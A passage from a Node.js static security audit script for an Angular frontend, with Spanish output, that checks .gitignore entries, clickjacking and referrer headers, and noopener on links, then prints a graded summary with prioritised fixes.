      '             💣 Código duplicado = parches de seguridad aplicados en uno pero no en otro.\n' +
      '             🛠️  FIX: Eliminar el servicio que no se use.'
    );
  }

  // Verificar si hay archivos .spec.ts (tests)
  const specFiles = collectFiles(SRC, ['.spec.ts']);
  if (specFiles.length === 0) {
    severity('MEDIO',
      'No se encontraron archivos de test (.spec.ts) en el proyecto.\n' +
      '             💣 Sin tests es imposible verificar que los guards y la autenticación\n' +
      '                funcionan correctamente después de cambios.\n' +
      '             🛠️  FIX: Agregar tests unitarios al menos para auth.service, guards y interceptors.'
    );
  } else {
    severity('OK', `${specFiles.length} archivo(s) de test encontrados.`);
  }

  // Verificar .gitignore protege archivos sensibles
  const gitignore = readFile('.gitignore');
  if (gitignore) {
    const shouldIgnore = ['dist', 'node_modules', '.env', '.angular'];
    for (const item of shouldIgnore) {
      if (!gitignore.includes(item)) {
        severity('MEDIO', `"${item}" NO está en .gitignore.`);
      }
    }
  }
}

// ─────────────────────────────────────────────────────────────
// 12. SEO Y META TAGS DE SEGURIDAD
// ─────────────────────────────────────────────────────────────
function testMetaSecurity() {
  header('12. META TAGS Y SEGURIDAD DEL HTML');

  const indexHtml = readFile('src/index.html');
  if (!indexHtml) return;

  // Verificar X-Frame-Options / frame-ancestors via meta
  if (!indexHtml.includes('X-Frame-Options') && !indexHtml.includes('frame-ancestors')) {
    severity('MEDIO',
      'No hay protección contra clickjacking en index.html.\n' +
      '             📁 src/index.html\n' +
      '             💣 Tu página puede ser cargada dentro de un iframe malicioso.\n' +
      '             🛠️  FIX: Configurar X-Frame-Options: DENY en el servidor web,\n' +
      '                o agregar frame-ancestors en tu CSP.'
    );
  }

  // Verificar referrer policy
  if (!indexHtml.includes('referrer')) {
    severity('BAJO',
      'No hay Referrer-Policy configurado.\n' +
      '             📁 src/index.html\n' +
      '             💣 Las URLs internas se envían como referrer a sitios externos.\n' +
      '             🛠️  FIX: <meta name="referrer" content="strict-origin-when-cross-origin">'
    );
  }

  // noopener/noreferrer en links externos
  const allHtml = collectFiles(SRC, ['.html']);
  for (const file of allHtml) {
    const content = fs.readFileSync(file, 'utf-8');
    const rel = path.relative(ROOT, file);

    const externalLinks = findInFile(content, /target\s*=\s*["']_blank["']/);
    for (const m of externalLinks) {
      if (!m.text.includes('noopener') && !m.text.includes('noreferrer')) {
        severity('BAJO',
          `Link target="_blank" sin noopener en ${rel}:${m.line}\n` +
          '             💣 La página abierta puede acceder a window.opener.\n' +
          '             🛠️  FIX: Agregar rel="noopener noreferrer"'
        );
      }
    }
  }
}

// ╔══════════════════════════════════════════════════════════════╗
// ║                      RESUMEN FINAL                           ║
// ╚══════════════════════════════════════════════════════════════╝

function printSummary() {
  console.log('\n');
  console.log(c.bold('╔════════════════════════════════════════════════════════════╗'));
  console.log(c.bold('║           📊 RESUMEN DE AUDITORÍA — FRONTEND              ║'));
  console.log(c.bold('╠════════════════════════════════════════════════════════════╣'));
  console.log(c.bold(`║  ${c.bgRed(' CRÍTICOS ')}  ${String(stats.critico).padStart(3)}  — Corregir INMEDIATAMENTE            ║`));
  console.log(c.bold(`║  ${c.red('🔴 ALTOS')}     ${String(stats.alto).padStart(3)}  — Corregir esta semana                ║`));
  console.log(c.bold(`║  ${c.yellow('🟡 MEDIOS')}    ${String(stats.medio).padStart(3)}  — Planificar corrección              ║`));
  console.log(c.bold(`║  ${c.cyan('🔵 BAJOS')}     ${String(stats.bajo).padStart(3)}  — Mejora recomendada                  ║`));
  console.log(c.bold(`║  ${c.dim('ℹ️  INFO')}      ${String(stats.info).padStart(3)}  — Informativo                        ║`));
  console.log(c.bold(`║  ${c.green('✅ OK')}        ${String(stats.ok).padStart(3)}  — Sin problemas                      ║`));
  console.log(c.bold('╠════════════════════════════════════════════════════════════╣'));

  const total = stats.critico + stats.alto + stats.medio + stats.bajo;
  let grade, gradeColor;
  if (stats.critico > 0) { grade = 'F'; gradeColor = c.bgRed; }
  else if (stats.alto > 3) { grade = 'D'; gradeColor = c.red; }
  else if (stats.alto > 0) { grade = 'C'; gradeColor = c.yellow; }
  else if (stats.medio > 3) { grade = 'B'; gradeColor = c.cyan; }
  else { grade = 'A'; gradeColor = c.green; }

  console.log(c.bold(`║  CALIFICACIÓN: ${gradeColor(grade)}                                       ║`));
  console.log(c.bold(`║  TOTAL HALLAZGOS: ${String(total).padStart(2)}                                     ║`));
  console.log(c.bold('╚════════════════════════════════════════════════════════════╝'));

  console.log(`\n${c.bold('🛠️  TOP 5 ACCIONES PRIORITARIAS:')}`);
  console.log(c.red('  1. Eliminar credenciales de demo de la página de login'));
  console.log(c.red('  2. Mover JWT de localStorage a cookie HttpOnly'));
  console.log(c.red('  3. Filtrar dominio en auth interceptor (no enviar token a externos)'));
  console.log(c.yellow('  4. Agregar Content-Security-Policy en index.html'));
  console.log(c.yellow('  5. Validar token contra backend en guards (no solo client-side)'));
  console.log(`\n${c.dim('Auditoría generada: ' + new Date().toISOString())}\n`);
}

// ╔══════════════════════════════════════════════════════════════╗
// ║                       EJECUTAR                               ║
// ╚══════════════════════════════════════════════════════════════╝

console.log('\n');
console.log(c.bold('╔══════════════════════════════════════════════════════════════╗'));
console.log(c.bold('║   🔒 AUDITORÍA DE SEGURIDAD — ANGULAR FRONTEND              ║'));
console.log(c.bold('║   Análisis estático de vulnerabilidades (OWASP Top 10)       ║'));
console.log(c.bold('╚══════════════════════════════════════════════════════════════╝'));

testExposedSecrets();
testXSS();
testInsecureStorage();
testAuthSecurity();
testHttpSecurity();
testPaymentSecurity();
testFormsSecurity();
testExternalScripts();
testBuildConfig();
testPrivacy();
testCodeHygiene();
testMetaSecurity();
printSummary();
